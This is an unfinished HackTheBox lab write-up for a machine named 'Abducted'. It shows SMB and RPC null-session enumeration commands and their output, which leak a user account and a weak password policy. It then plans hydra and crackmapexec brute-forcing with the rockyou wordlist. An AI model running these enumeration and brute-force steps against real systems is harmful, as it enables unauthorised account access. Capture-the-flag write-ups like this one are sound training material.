---
type: writeup
platform: HTB
name: Abducted
os: Windows
difficulty: Medium
status: in-progress
tags: [htb, windows, medium, smb, rpc, null-session, enumeration, enum4linux-ng, smbclient, smbmap]
techniques:
  - SMB null session enumeration
  - RPC anonymous access
  - User enumeration via RPC (querydispinfo / enumdomusers)
  - Share enumeration via RPC
  - Password policy extraction via RPC
tools:
  - nmap
  - enum4linux-ng
  - smbclient
  - smbmap
  - rpcclient
date: 2026-09-24
---

# Abducted — HackTheBox Writeup

![](images/Pasted%20image%2020260924162319.png)

---

## Summary

Abducted is a medium-difficulty Windows machine hosting a Samba file server ("Hartley Group Document Services"). The machine allows unauthenticated SMB and RPC null sessions, leaking OS information, a single local user account (`scott` / Scott Mercer), and two restricted file shares (`projects`, `transfer`). Enumeration is the core of the initial foothold phase — the attack surface exposed anonymously provides everything needed to target the `scott` account.

**Attack Chain:**
1. Nmap identifies SMB (445/139) as the primary attack surface
2. `enum4linux-ng` null session reveals OS, user `scott`, shares, and password policy
3. RPC anonymous access confirms user details: RID 1000, full name Scott Mercer, home drive `\\ABDUCTED\scott`
4. Shares `projects` and `transfer` are access-denied — credential required → target `scott`
5. *(foothold / privesc steps in progress)*

---

## Enumeration

### Nmap Scan

![](images/Pasted%20image%2020260924162507.png)

```bash
sudo nmap -sCV 10.129.244.177
```

![](images/Pasted%20image%2020260924162540.png)

**Key open ports:**

| Port | Service | Detail |
|------|---------|--------|
| 139/tcp | NetBIOS-SSN | SMB over NetBIOS |
| 445/tcp | Microsoft-DS | SMB direct |

No web service on 80/443 — SMB is the primary attack surface.

```bash
echo "10.129.244.177 abducted.htb" | sudo tee -a /etc/hosts
```

![](images/Pasted%20image%2020260924162613.png)

---

### SMB Enumeration

#### Initial smbclient / smbmap probe

![](images/Pasted%20image%2020260924171112.png)

```bash
smbclient -L //10.129.244.177 -N
smbmap -H 10.129.244.177
```

An unauthenticated (`-N`) listing returns shares, confirming the server responds to null sessions.

#### enum4linux-ng Full Scan

![](images/Pasted%20image%2020260924171357.png)

```bash
enum4linux-ng -A 10.129.244.177
```

`enum4linux-ng` wraps SMB, RPC, and LDAP enumeration into a single run. The `-A` flag runs all checks. Full output below.

![](images/Pasted%20image%2020260924171426.png)

---

### RPC Null Session

![](images/Pasted%20image%2020260924172149.png)

The server allows both true null sessions (username `''`, password `''`) and guest-style access (random username, empty password):

```
[+] Server allows authentication via username '' and password ''
[+] Server allows authentication via username 'euxynpxn' and password ''
```

This means `rpcclient -U "" -N` will work without any credentials.

#### OS Information via RPC

![](images/Pasted%20image%2020260924172208.png)

```
OS: Windows 7, Windows Server 2008 R2
OS version: 6.1
Platform id: 500
Server type string: Wk Sv PrQ Unx NT SNT Hartley Group Document Services
```

The "Unx" flag in the server type string indicates this is **Samba running on Linux** emulating a Windows SMB server — not a native Windows host.

#### User Enumeration via RPC

![](images/Pasted%20image%2020260924172224.png)

```bash
rpcclient -U "" -N 10.129.244.177 -c "querydispinfo"
rpcclient -U "" -N 10.129.244.177 -c "enumdomusers"
```

![](images/Pasted%20image%2020260924172306.png)

Both `querydispinfo` and `enumdomusers` return the same single account:

| Field | Value |
|-------|-------|
| RID | `0x3e8` (1000) |
| Username | `scott` |
| Full name | Scott Mercer |
| Home drive | `\\ABDUCTED\scott` |
| ACB flags | `0x00000010` (normal user account) |
| bad\_password\_count | `0x00000000` (no failed logins recorded) |
| logon\_count | `0x00000000` (no successful logins recorded in this field) |

> **Note on the counters:** `bad_password_count = 0` and `logon_count = 0` are simply RPC-exposed state fields — they don't mean the account is new or unused. They reset on reboot or policy flush and are useful for confirming no lockout threshold has been hit before a brute-force attempt.

---

### Share Enumeration

![](images/Pasted%20image%2020260924172729.png)

```bash
enum4linux-ng -A 10.129.244.177
# or directly:
rpcclient -U "" -N 10.129.244.177 -c "netshareenumall"
```

![](images/Pasted%20image%2020260924172740.png)
![](images/Pasted%20image%2020260924172751.png)

Four shares discovered:

| Share | Type | Comment | Anonymous Access |
|-------|------|---------|-----------------|
| `HP-Reception` | Printer | Reception printer | Map OK, Listing not supported |
| `IPC$` | IPC | Hartley Group Document Services | Map OK, Listing not supported |
| `projects` | Disk | Hartley Group Project Files | **DENIED** |
| `transfer` | Disk | Staff file transfer | **DENIED** |

The two disk shares (`projects` and `transfer`) are the interesting targets but require valid credentials. The only known user is `scott`.

---

### Password Policy

![](images/Pasted%20image%2020260924174615.png)
![](images/Pasted%20image%2020260924174621.png)

```bash
enum4linux-ng -A 10.129.244.177
# Policy section:
```

```
Minimum password length: 5
Minimum password age: none
Maximum password age: ~136 years (effectively never expires)
Password complexity: DISABLED
Account lockout threshold: NONE
```

![](images/Pasted%20image%2020260924174631.png)

> **Key finding:** No lockout threshold and no complexity requirement. This means brute-forcing `scott`'s password carries **no risk of locking the account** and the password may be short or simple.

---

### Full enum4linux-ng Output

![](images/Pasted%20image%2020260924174755.png)
![](images/Pasted%20image%2020260924174825.png)

```
ENUM4LINUX - next generation (v1.3.10)

Target: 10.129.244.177

NetBIOS Names:
  ABDUCTED <00> - Workstation Service
  ABDUCTED <03> - Messenger Service
  ABDUCTED <20> - File Server Service
  WORKGROUP <00> - Domain/Workgroup Name
  WORKGROUP <1e> - Browser Service Elections

SMB Dialects supported:
  SMB 2.0.2 / 2.1 / 3.0 / 3.1.1 (preferred: SMB 3.0)
  SMB signing NOT required

Domain: WORKGROUP (workgroup member — not domain-joined)
Domain SID: NULL SID
FQDN: abducted

Users (1 total):
  scott — RID 1000 — Scott Mercer

Groups: none

Shares: HP-Reception (printer), IPC$, projects (DENIED), transfer (DENIED)

Password policy:
  Min length: 5 | Complexity: off | Lockout: none
```

---

## Foothold

> *(In progress — gaining access to `scott` account to reach `projects` / `transfer` shares)*

**Next steps based on enumeration findings:**

Given no account lockout and a weak password policy, the logical next step is to attempt password brute-forcing against `scott` over SMB:

```bash
# Using hydra against SMB
hydra -l scott -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt \
  smb://10.129.244.177

# Or crackmapexec (more SMB-aware)
crackmapexec smb 10.129.244.177 -u scott -p /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Once authenticated:

```bash
# List share contents
smbclient //10.129.244.177/transfer -U scott
smbclient //10.129.244.177/projects -U scott

# Or map with smbmap
smbmap -H 10.129.244.177 -u scott -p <password>
```

---

## Key Takeaways (Enumeration Phase)

| Lesson | Detail |
|--------|--------|
| **SMB null sessions still exist** | Modern Samba installs often still permit null/guest auth unless explicitly disabled. Always try `-N` and empty credentials before assuming auth is required. |
| **RPC leaks more than SMB listing** | `querydispinfo` and `enumdomusers` over RPC give full user details (RID, full name, home drive, account flags) that SMB share listing alone won't reveal. |
| **"Unx" server type flag** | The `Unx` bit in the SMB server type string reveals the host is Samba on Linux, not Windows — relevant for later exploit selection. |
| **No lockout = safe brute force** | Always extract the password policy before brute-forcing. Zero lockout threshold here makes it safe to run a full wordlist against `scott`. |
| **enum4linux-ng over enum4linux** | The `-ng` rewrite handles modern SMB dialects, has cleaner output, and skips failed checks gracefully. Prefer it over the original Perl version. |

---

## Tools Used

- nmap
- enum4linux-ng
- smbclient
- smbmap
- rpcclient
- hydra / crackmapexec *(planned)*
